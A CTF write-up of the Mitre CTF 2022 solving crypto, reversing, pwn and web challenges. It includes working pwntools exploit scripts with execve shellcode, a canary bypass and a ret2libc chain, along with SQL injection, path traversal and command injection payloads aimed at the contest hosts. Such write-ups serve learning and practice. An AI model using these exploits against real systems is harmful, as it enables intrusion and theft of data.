# Mitre CTF 2022
Mitre ran a CTF from 12/10/2022 to 12/11/2022. It started at 1pm CST, and we finished as a team at 5pm CST the same day (Mainly myself (Sam), richyliu (Richard), and WhiteHoodHacker (Minh)). There were a total of 18 challenges across 4 categories. Here are most of the writeups.
## crypto 50
```
What could this mean?

http://44.197.231.105:3015
```

Given a string of text and an obvious flag:

```
Pu jyfwavnyhwof, h Jhlzhy jpwoly pz jhalnvypglk hz h zbizapabapvu jpwoly pu dopjo aol hswohila pu aol wshpu alea pz zopmalk if h mpelk ubtily kvdu aol hswohila. Hkchuahnlz vm bzpun h Jhlzhy jpwoly pujsbkl: Vul vm aol lhzplza tlaovkz av bzl pu jyfwavnyhwof huk jhu wyvcpkl tpuptbt zljbypaf av aol pumvythapvu. Jhlzhy vujl zhpk aoha opz mhcvypal mshn dhz TJH{1i09hjl75jl6lkm1535289h740mh0i1hi331ml64}
```
Rotate every character forward by 19, you recover the flag:
`MCA{1b09ace75ce6edf1535289a740fa0b1ab331fe64}`

## crypto 100
```
We have intercepted a file that was being sent to an outside company. We believe there is a message hidden within it can you find it?

http://44.197.231.105:3016
```

This leads to a directory listing of a PDF file. This docum,ent discusses file formats, and speficially, how you can make files pretend to be other files. Treating the PDF file like a .zip file reveals an archive with a couple key messages:

```
A-Y 5x5
311555:3324454311

A-Z
YKT{r98c829m5j05xuf5m67mu78101vd8m77m1v0369r}
```

Ignoring the ascii art, I could tell that the 5x5 was a polybius cipher, with A-Y filled in the 5x5 table as expected

Decrypting it gives you KEY:MITRA.

The second half looks to be a Vignere cipher, using a decoder with the key nets the flag:

`MCA{a98c829a5b05edf5a67eb78101ed8a77e1c0369a}`

## crypto 150

```
Read the text with some charisma we need to be preparing for the play.

I need you to tip toe the line between your character and yourself.

Great, now that it’s clear, let’s take from your last lines.

Gandalf - “It is not despair, for despair is only for those who see the end beyond all doubt. We do not.”

Everyone in costumes, I think that is exactly what we were looking for.

Don’t lose this confidence during the play you are Gandalf after all; white beard up and big smiles the show is about to start.

R2FuZGFsZiAtIFdlIG11c3QgZVhPUmNpc2UgdGhlIGRlbW9uIG9mIEJhbHJvZ3Mgb3V0IG9mIHRoaXMgcGxhbmUgb2YgZXhpc3RlbmNlIGluIG9yZGVyIHRvIGdldCB0byBMb3RobMOzcmllbi4KCjFGIDBBIDA2IDNDIDI2IDdDIDM2IDcwIDczIDc1IDc3IDcxIDZBIDJEIDczIDc0IDIxIDc2IDY3IDdBIDc3IDcyIDcyIDIwIDMxIDJEIDIxIDc2IDc3IDczIDMxIDcwIDcwIDcyIDcyIDI3IDYxIDJGIDIzIDcyIDIzIDI2IDM3IDJEIDNBIA==
```

Converting the obvious text from b64:

```
Gandalf - We must eXORcise the demon of Balrogs out of this plane of existence in order to get to Lothlrien.

1F 0A 06 3C 26 7C 36 70 73 75 77 71 6A 2D 73 74 21 76 67 7A 77 72 72 20 31 2D 21 76 77 73 31 70 70 72 72 27 61 2F 23 72 23 26 37 2D 3A 
```

The hint here tells us to XOR. Since the 4th byte and the 3rd byte are 2 away from each other, it's indicative that this is probably the flag.

Knowing that the flag starts with `MCA{`, we deduced that the first part of the key was `RIGG`. After some hopeless searching for some LOTR reference, there's only 5 words that start with `RIGG` and `RIGGED` was our key, netting the flag. Minh, however used padding to guess the last two letters, leading to the solve:

`MCA{c8d942258d43d253057dcdf127c9757c3fd5fbed}`

## pwn 100

```
I heard pwn100 is pretty easy.

nc 44.197.231.105 3000
```
To be completely honest, the worst part of the CTF was binary-less pwn. 4/5 of them weren't *hard*, per se, just really annoying to not be able to gdb it. Also 32 bit. Yuck.

Connecting to the IP gives us:

```
Welcome to pwn100! Your job is to overflow the vulnerable buffer to overwrite the challenge function's return address.

The program will now read 60 bytes into a 20 byte buffer at 0xffe163ec: 
```

Screaming into the terminal nets us the flag:

`MCA{50dce13d1d6a937b6f0e211d090c7328f9f90ad3}`

## pwn 200
```
I heard pwn200 is slightly harder than pwn100.

nc 44.197.231.105 3001
```

```
Welcome to pwn200! Your job is to make this function return to the print_flag function (print_flag address: 0x8049256).

The program will now read 60 bytes into a 20 byte buffer at 0xffdb60ec:
```

They give you the print_flag address, so screaming into the terminal for 48 bytes, followed by the print_flag address (in little endian) gives the flag.

`(perl -e 'print "A" x 48 . "\x56\x92\x04\x08" . "\n"') | nc 3.238.30.178 3001`

`MCA{98a4b4c15f3b1ae77891e12ab412d84fbd3f89e7}`

## pwn 300
```
I heard pwn300 is slightly harder than pwn200.

nc 44.197.231.105 3002
```

```
Welcome to pwn300! Your job is to make this program execute shellcode to read the flag.txt file on the remote server. (Hint check out this function: 0x8049216)

The program will now read 80 bytes into a 20 byte buffer at 0xffd8e52c:
```
Cheeky of them to tell us to check out a function, of which we can't view the behavior, since we don't have a binary! *grumble grumble*

If you want the details of how shellcode works, you can view my other writeups available. For the sake of simplicity, I'll post my script here:

```py
from pwn import *

r = remote('44.197.231.105', 3002)
r.recvuntil(b' at 0x')
stack = int(r.recvuntil(b':', drop=True), 16)
sc = b'\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
lsc = len(sc)
r.sendline(sc + b'A'*(48-lsc) + p32(stack))
r.interactive()
```

The stack has a 20 byte buffer, but 48 bytes total before the return pointer. The stack pointer is already given to us, so we just input our shellcode, buffer with internal screaming, then set the return pointer back to the stack.

`MCA{b2190e22b011aed60a6d60502bfcb9384375ad8b}`

## pwn 400
```
I heard pwn400 is more challenging than pwn300.

nc 44.197.231.105 3003
```
```
Welcome to pwn400! Your job is to make this program execute shellcode to read the flag file on the remote server. (Hint stack canary value: 0x8b5aa400)

The program will now read 80 bytes into a 20 byte buffer at 0xffef6708:
```
This challenge caused me a great amount of pain for no reason. All that changed is that after our 20 byte buffer, theres a stack canary (4 bytes). Then there's 28 bytes until the return address. *In theory*, our shell code can be before or after that canary, we return to it, and as long as we preserve the canary, everything's good.

Our shellcode would never work if it was before the return address.

Anyway, same deal, different story:

```py
from pwn import *

r = remote('44.197.231.105', 3003)

print(r.recvuntil(b'value: 0x'))
canary = int(r.recvuntil(b')', drop=True), 16)
r.recvuntil(b' at 0x')
stack = int(r.recvuntil(b':', drop=True), 16)
sc = b'\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
lsc = len(sc)
r.sendline(b'A' * 20 + p32(canary) + b'A' * 28 + p32(stack+56) + sc)
r.interactive()
```

We scream into the buffer, then perserve the canary, then scream until the return address, then place our shellcode, which we've pointed our return address to.

`MCA{da19862838be1f5ee10398d1023544f59062bf67}`

# pwn 500
```
I heard pwn500 is more challenging than pwn400.

nc 44.197.231.105 3004
```
```
Welcome to pwn500! Your job is to make this program read in the string '/bin/sh\x00' then return to the libc system function. (Hint stack canary value: 0xfa480000)

The program will now read 200 bytes into a 20 byte buffer at 0xff8fec68:
```
Pretty much all of the headway on this chal was done by Richard, but I'll recount most of the process.

If you recall, we *still* don't have a binary. Now, they're asking us to do ret2system without a libc, either.

However, we did solve pwn300 and pwn400, which had rce and shells popped. So, assuming the same guy developed all of these chals, we scraped the libc and binaries from the pwn300 and pwn400 environment.

When a program is dynamically linked, they make use of the Producure Linkage Table (PLT) and the Global Offset Table (GOT) to resolve calls to libc, without actually having the code of libc in the binary. Since pwn 300/400/500 are all similar programs, we expected there to be similar constructions of the PLT.

The PLT is useful here, because ALSR is on, so we don't know what address our program is starting at. However, the PLT has fixed addresses. So if we're able to call something at the PLT, we can leak where libc is based, and then follow through with ret2system.

The PLT is also predictable, each call to libc is seperated by 16 bytes. So, we know *about* where puts() should be in the PLT, so we did a small brute force search to figure it out:


```py
from pwn import *

libc = ELF('./libc.so.6')

for i in range(16):
    r = remote('44.197.231.105', 3004)

    print(r.recvuntil(b'value: 0x'))
    canary = int(r.recvuntil(b')', drop=True), 16)
    print(hex(canary))
    r.recvuntil(b' at 0x')
    stack = int(r.recvuntil(b':', drop=True), 16)

    # puts = 0x08049150 + 16*i
    puts_reloc = 0x0804827c
    payload = flat({
        20: p32(canary),
        48: p32(stack + 0x40), # ebp
        52: b''.join([
            p32(puts),
            p32(0x804968c - 5),
            p32(puts_reloc),
        ])
    }, filler=b'\x90', length=80)

    r.sendline(payload)
```

After a few of these atttempts, we found that one address that we set to puts printed out an extra new line (sneaky!). We also found that shortly after, an address caused the program to restart, which is caused by the libc entry function: `libc_start_main`.

So the gameplan was this:

- Call `puts` with `puts_reloc` as it's argument to leak the libc address of `puts`
- After we call `puts` to leak libc, we also place the address of `libc_start_main` to restart the program, but this *doesn't* rerandomize the base addresses
- Now, with leak in hand, follow through with a relatively standard ret2libc: place `bin/sh/\x00` on the stack, find and call `system()` in libc.

The final solve script:
```py
from pwn import *

libc = ELF('./libc.so.6')

r = remote('44.197.231.105', 3004)

print(r.recvuntil(b'value: 0x'))
canary = int(r.recvuntil(b')', drop=True), 16)
print(hex(canary))
r.recvuntil(b' at 0x')
stack = int(r.recvuntil(b':', drop=True), 16)

puts = 0x080490f0
print('puts:', hex(puts))
puts_reloc = 0x804c018
addr = stack + 56
payload = flat({
    20: p32(canary),
    48: p32(stack + 0x40), # ebp
    52: b''.join([
        p32(puts),
        p32(0x804968c - 5),
        p32(puts_reloc),
    ])
}, filler=b'\x90', length=80)

r.sendline(payload)
r.recvuntil(b'return')
r.recvuntil(b'--\n')

leak = u32(r.recvn(4))
print('leak:', hex(leak))

libc.address = leak - libc.symbols['puts']

print('libc base:', hex(libc.address))


system_addr = libc.symbols['system']
print('system:', hex(system_addr))

print(r.recvuntil(b'value: 0x'))
canary = int(r.recvuntil(b')', drop=True), 16)
print(hex(canary))
r.recvuntil(b' at 0x')
stack = int(r.recvuntil(b':', drop=True), 16)

payload = flat({
    0: b'/bin/sh\x00',
    20: p32(canary),
    48: p32(stack + 0x40),
    52: b''.join([
        p32(system_addr),
        p32(0x804968c - 5),
        p32(next(libc.search(b'/bin/sh\x00'))),
    ])
}, filler=b'\x90', length=80)

r.sendline(payload)
r.interactive()
```

Running it gave us a shell, and thus the flag:

`MCA{9c092baece1b32a9babd3ea88a169c57bfdc9672}`

## rev 100
```
Think you can find the password…

http://44.197.231.105:3005
```
**All of these rev chals were solved by Richard before I could even look at the CTF.**

Run `strings` on the binary.

`MCA{db346ae600417d8cbceb5c86914b627165635e77}`

## rev 200
```
Think you can reverse engineer the password…

http://44.197.231.105:3006
```

Don't worry about how the program is encrypting the flag. Instead, run the program, stop at address `0x0804873c` and set `eax` to 1, bypassing a check and outputting the flag:

`MCA{f677992ef948fbdcb542012db93c3c6b8ad6ec26}`

## rev 300
```
Think you can reverse engineer the password this time…

http://44.197.231.105:3007
```

A string on the binary was a b64 string:

```
NGQ0MzQxN2I2MTM2MzEzMDY0NjI2MzM0NjUzNDYyMzYzMTM2Mzk2NTYzMzkzNTYxNjQzNTY1NjYzMjYxNjY2NTYxMzIzMTMwMzkzNzM0MzQzNzMyMzIzNjc=
```

Leading to the hex:

```
4d43417b613631306462633465346236313639656339356164356566326166656132313039373434373232367
```

Leading to the flag (missing a `}`):

`MCA{a610dbc4e4b6169ec95ad5ef2afea21097447226}`

## rev 400
```
Think you can reverse engineer the password…

http://44.197.231.105:3008
```

Given the hashes, brute force each byte individually. Solve script below:

```py
#!/usr/bin/env python3

from hashlib import sha256
import string

# These are hashes for the first character, first two characters, first three
# characters, etc. of the flag
hashes = [
    '08f271887ce94707da822d5263bae19d5519cb3614e0daedc4c7ce5dab7473f1',
    'ca34ab5c748c6607c7ca4a826b44c5bdc1c48e8c3b10987890a1944eafa8eedf',
    '94a7900acfa9615bef450ab1a8da1c377273ba36e9af7d58c55f68f929188cea',
    '3b0a38d8724856e4af3b5f05f5166e279031087c7dd9047ba6ba28b538e622d5',
    '675bec1e50754a5b08a21a8692e664a45e498d741d90aa4f46efbf7638b44f70',
    '72b62debe229e2c8331804d86a6fb571073ab0c5b4969e69d1853d8c2aa7fba7',
    '702817bb7817cf56ced47711877edd2fe7f253e7cde1b245a5ef2e35376c77da',
    'b5219691d7468c8e6323aa39a3e93d3d3765b36f04a1bfe3b40be727874054ef',
    'e81264aad4517cbe0ab24228b84d93d7a5cd1bdcdcd3c7153d1514b65ba40e1a',
    '0a445b2e68bba964a3bd262178e33ef15f82cc64da53ada673e696cf2961fe1e',
    'e78570c7f418f44e8ac685cff8d61147fcbff3dc69c879037377ee328f8395e4',
    'b1b54e855985403629c9e1c5aac0dd9ea1321c86a07717b3fa816bc182d70148',
    '8f2817b60fff5d6e2080033c112d5206a0e832c5ddbb03434c18d0488f4e6b19',
    'e09efc12abef89d70397e7d704d670f989093296b8b00007f38dcd8d901a8904',
    'f31225c095d1eb997f1d3d2e63041f8a446b1376102f5a35037909c1360b33e5',
    '2e166eb44fa143eee890a61a64e52151562ab30a5cbd19b54f888a1ece4757a7',
    '554e66a6da2ac81fd8e73542934331119cba1d86c9145c6ec741385b27a752fb',
    'ee68ae58aa3c75186b888d8fd948e4eeff1710b220ca5e0a0abc7928c69bf8da',
    '8f4b24f6655da918aed0be2f1ce86a931c07e5bb3900964d31dbed0e27ff3fad',
    '27e3c6179a28bbd9183785d999dfe9bce8db054a31ce4e8babbb3edd0249422c',
    '8184eb8c722f839eb595163dae70b4e00d353a53a176e83765820c88a252974b',
    'f415fc601eace2cd240b217409f3439b7320dfa681d07b0a457c2e8dc295eba1',
    '92fb095361e029e4ece3b722113e47ad70e2d4796df1679b9317e64c99f764ec',
    '150406d13136310ad9fa0833fcc2809ac9e22626d6e307302ad2a4d81aa17ff9',
    'd9c9c332164d33f753682105a3f6ca2f090920e11ba0e356e053042614945fe5',
    'b86e805db405d519b7be814d8a6b17acf232aea32673a350f304b14eebca900e',
    'af962e1c1f0e0c681845b08590b8d15ab050b79b93c6f37ee9313fe37e672446',
    '9b9db9f0f804214ca6454c4a0786a9b2b368c0382d1dbd8b72e52ddcdccb9d64',
    '2a364b91f479db1d1e5e457fedf7d09e4743c2bf5dda47308bad35031847fc7b',
    '451928c5056fa00d6f6818d7e1fe4c527598e2715a7de46cea4ca7cd0f986e91',
    'dad8ea4d6b1629a46c13e024dacae37a7c895d15869f54607e1cdbcfcbb2dda3',
    '88717d1505ca913e212e0d2ae27317932cd4151d6143f5c28616baed162acc61',
    '9203a15b1a3b68695d9582f5e01aac2df22692fb35513e6a8cf8bd2334cabb4b',
    'c918de8c95453b3a5153a699f5926786fbf94c553b77021efe8f4151f9242d3b',
    '24d6578f6f3ee8c903fbe6cdd162ae9b9864134a6647ae7db3add53129e58e7a',
    '961d08e5ee400a4e6bfbf6d72509735acb4715c742679146c1d96394f795a491',
    '7b419fec09a3c9c688376c18b84331337306a7187ce0ba89e70c118f86fc44a4',
    '59442b831284708309764fb1d62d68aff3547573cb24fcac3ff54cb003d6d58f',
    '1232742bca5958f388afb2747250146e50e5bf0c9bf1e289088cf06144e6ce46',
    '8b78c178d459dcd984bee1a99deeaac03df19a6e56f2d432f4dc59b924c62400',
    '6da8c77b3cfcaf4bdfdbc20ebc0aeab782f1d6a1f8cb5456428c92a853a77afa',
    '4e32e61af4126fd253bff38b13d41b45af861d4a9917f4ab8657c13f34a55f12',
    'c219eb1990f1ffb97991abfe1a39c7d2ddff2260e1e174a4ae04710672b7456b',
    'c3219ba431606a43a96883209861088fb623f844298cc5e41295c57435bba579',
    'ff47a211ec9ef080037fdfc7b05fce37630ad32d2ca7bdb56bb152405125f9ce',
]

# We can progressively brute force a character of the flag at a time

flag = b''
for i in range(len(hashes)):
    for c in string.printable:
        if sha256(flag + c.encode()).hexdigest() == hashes[i]:
            flag += c.encode()
            print(flag)
            break
```

`MCA{1ccb4978a9ec500fe1d4d2e6e6aa0a31f3fa6f97}`

## web 100
```
They told me make it easy, so I did.

http://44.197.231.105:3020
```

The unfedereated XSS is a redherring. The flag is in a cookie:

`MCA{e442d224e08167c18a4e30744ddf35816bd88aa9}`

## web 150
```
Hmm, but how do I login?

http://44.197.231.105:3021
```
Minh discovered that it was a login page based on a SQL table.

Using the payload for admin and password being: `' OR 1==1--1` leads us to a page with the flag:

`MCA{d005d44e20921ec979306bfb8bdc8a9eef459c8d}`

## web 200
```
You’ll be shocked when you finally get it.

http://44.197.231.105:3022
```
Minh took the full lead on this one.


A possible route:

A comment on the site mentions about robots, so lets check `/robots.txt`. We find the file `/cgi-bin/status.cgi`
`shellshocker.py` tells us that this is vulnerable to shellshock. We setup with standard payloads (either through nc/curl/metasploit) to get a reverse shell and get the flag:

`MCA{721af99eaabd12a59602e8ade39caab934bea333}`
## web 300 
```
The country of Ubetchaman is at it again. We heard one of their noobie hackers, hackerman, has been storing a bunch of stolen data on this terrible website. Show them your superior 1337 hacker skills and find a way in!

http://44.197.231.105:3023
```
Going to any page will bring you to `http://44.197.231.105:3023/index.php?page=submit`

Changing the `page=` to be `page=flag.txt` gives us a taunt that doing that would be too easy.

doing `/etc/passwd` shows us an account on the server:
```
Proxy,,,:/run/systemd:/bin/false hackerman:x:1000:1000::/home/hackerman:/home/hackerman
```

So, changing the page to `page=/home/hackerman/flag.txt` gives us the flag:

`MCA{c20643d936f1c1b373c530b94ce224176d24d1de}`

## web 400
```
MCA Web admins are some of the best in the biz..

http://44.197.231.105:3024
```

Page brings you to a seemingly useless 404-type page that there's no content.

Minh realized, that changing the host parameter in the rquest to mcawebhosting.com brings you to a "customer facing site"

Changing it to `admin.mcawebhosting.com` brings you to an admin login page, which the username and password is admin admin

`MCA{2e4578cc9deb5913857f3411c416bcb56f8fde30}`

## web 500
```
They told me make it hard, so I did.

http://44.197.231.105:3025
```

We're told to log in to the application.

Default creds of admin admin leads to a "Ping Server Utility"

Ping actually seems to work, which leads me to believe that it's just running bash commands of some sort.

Giving it the payload `; ls` lists the directory, with a file called step2:

```
Developer task list:

- fix registration page
- change the default credentials from admin:admin
- lock down service on port 3046 (right now just using a password of "wut")
- something about a flag
```

Going to the service on port 4046 is a SQL database. We can turn debug mode on to see our SQL queries easier, and give it the query in the url, despite the limited dropdown and submit form that exists on the page.

Typing in: `http://44.197.231.105:3046/?province="OR%201=1--&password=wut&debug=1`

Tells us about a user with an entry like:

```
FIRST NAME = CORTEX
LAST NAME = USER
DEPARTMENT = CORTEX
PROVINCE = SomethingThatPeopleWouldNeverGuessSoTheyHaveToUseActualInjectionToGetThis
```
Richard got the final query from this:

```
http://3.238.30.178:3046/?province=" UNION SELECT username, password, NULL, NULL,NULL,NULL,NULL FROM ACCOUNTS--&password=wut&debug=1
```

Which gives us an entry that contains the flag

`MCA{c706a97ac54c0d362cd188153d40d0791fa58899}`
